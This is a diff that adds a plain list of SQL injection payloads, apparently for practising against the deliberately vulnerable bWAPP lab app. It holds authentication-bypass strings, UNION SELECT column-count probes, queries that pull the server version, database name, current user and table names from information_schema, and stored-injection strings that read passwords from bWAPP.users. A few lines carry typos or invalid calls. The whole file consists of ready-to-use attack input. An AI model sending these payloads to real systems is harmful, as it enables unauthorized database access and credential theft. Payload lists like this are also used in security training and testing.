@@ -1,0 +1,100 @@
+﻿' or 1=1 --
+' UNION SELECT ALL 1--
+'==== GET Search ==='
+' UNION SELECT ALL 1--
+' UNION SELECT ALL 1,2--
+' UNION SELECT ALL 1,2,3--
+' UNION SELECT ALL 1,2,3,4--
+' UNION SELECT ALL 1,2,3,4,5--
+' UNION SELECT ALL 1,2,3,4,5,6--
+' UNION SELECT ALL 1,2,3,4,5,6,7--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+
+
+0' UNION SELECT ALL @@version--
+0' UNION SELECT ALL @@version,2--
+0' UNION SELECT ALL @@version,2,3--
+0' UNION SELECT ALL @@version,2,3,4--
+0' UNION SELECT ALL @@version,2,3,4,5--
+0' UNION SELECT ALL @@version,2,3,4,5,6--
+0' UNION SELECT ALL @@version,2,3,4,5,6,7--
+0' UNION SELECT ALL @@version,2,3,4,5,6,7,8--
+0' UNION SELECT ALL @@version,2,3,4,5,6,7,8.9--
+0' UNION SELECT ALL @@version,2,3,4,5,6,7,8,9,10--
+
+0' UNION SELECT ALL 1,@@version,3--
+0' UNION SELECT ALL 1,@@version,3,4--
+0' UNION SELECT ALL 1,@@version,3,4,5--
+0' UNION SELECT ALL 1,@@version,3,4,5,6--
+0' UNION SELECT ALL 1,@@version,3,4,5,6,7--
+0' UNION SELECT ALL 1,@@version,3,4,5,6,7,8--
+0' UNION SELECT ALL 1,@@version,3,4,5,6,7,8,9--
+0' UNION SELECT ALL 1,@@version,3,4,5,6,7,8,9,10--
+
+0' UNION SELECT ALL 1,2,@@version,4,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,@@version,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,@@version,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,@@version,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,@@version,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,@@version,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,8,@@version,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,@@version--
+
+0' UNION SELECT ALL database()--
+0' UNION SELECT ALL database(),2,3,4,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,database(),3,4,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,database(),4,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,database(),5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,database(),6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,database(),7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,database(),8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,database(),9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,8,database(),10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,database()--
+
+
+0' UNION SELECT ALL user(),2,3,4,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,user(),3,4,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,user(),4,5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,user(),5,6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,user(),6,7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,user(),7,8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,user(),8,9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,user(),9,10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,8,user(),10--
+0' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,user()--
+
+0' UNION SELECT ALL table_name,2 from information_schema.tables--
+0' UNION SELECT ALL 1,table_name,2 from information_schema.tables--
+0' UNION SELECT ALL table_name,2,3 from information_schema.tables--
+0' UNION SELECT ALL 1,table_name,2,3,4 from information_schema.tables--
+0' UNION SELECT ALL 1,table_name,2,3,4,5 from information_schema.tables--
+
+'=== stored(blog)==='
+hello world',(select password from bWAPP.users where id=1 limit 0,1))--
+hello world',(select * from bWAPP.users where id=1 limit 0,1))--
+hello world',(select * from databases() where id=1 limit 0,1))--
+hello world',(select databases()))--
+hello world',(select user()))--
+hello world',(select system_user())--
+hello world',(select @@version))--
+hello world',(select @@datadir))--
+
+'==== GET Search ==='
+' UNION SELECT ALL 1--
+
+
+') or 1=1 ][(' or
+
